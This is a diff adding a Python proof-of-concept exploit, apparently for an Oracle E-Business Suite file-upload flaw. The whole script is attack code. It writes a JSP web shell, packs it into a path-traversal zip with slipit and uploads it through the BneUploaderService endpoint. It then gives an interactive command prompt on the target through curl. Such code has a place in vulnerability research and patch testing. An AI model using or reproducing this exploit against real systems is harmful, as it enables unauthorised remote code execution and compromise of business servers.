@@ -1,0 +1,63 @@
+#!/usr/bin/python3
+#POC by HMs
+import requests
+import os
+import sys
+
+
+shell = ''' 
+<%@ page import="java.util.*,java.io.*"%>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String line = dis.readLine();
+    while(line != null) {
+        out.println(line); 
+        line = dis.readLine(); 
+    }
+}
+%>
+'''
+
+def Write_Shell():
+  with open("shell.jsp", "w") as f:
+    f.writelines("%s \n" %(shell))
+  os.system("slipit --overwrite --separator '/' --depth 5 --prefix '/FMW_Home/Oracle_EBS-app1/applications/forms/forms/' shell.zip shell.jsp")
+  os.system("uuencode shell.zip shell.zip > shell.uue")
+
+
+def exploit():
+  Write_Shell()
+  host = sys.argv[1]
+  if host.endswith == '/':
+    url = host + 'OA_HTML/BneUploaderService?bne:uueupload=true'
+    url_shell = host + 'forms/shell.jsp'
+  else:
+    url = host + '/OA_HTML/BneUploaderService?bne:uueupload=true'
+    url_shell = host + '/forms/shell.jsp'
+  file = 'shell.uue'
+  up = {
+    'text':(file,open(file, 'rb'), 
+      "multipart/mixed"
+      )
+    }
+  request = requests.post(url,files=up)
+  check = requests.get(url_shell)
+  if check.status_code == 200:
+    print('\n-----------------------------------\n[+] Exploiting .......\nShell has uploaded!\n-----------------------------------\n')
+    while True:
+      cmd = input("~shell[~]: ")
+      if cmd == 'q' or cmd == 'quit' or cmd == 'Q':
+        break
+      else:
+        #print("curl %s?cmd=%s" % (url_shell,cmd))
+        os.system("curl %s?cmd=%s" % (url_shell,cmd))
+  else:
+    print("\nnot vuln")
+
+if __name__ == '__main__':
+  exploit()
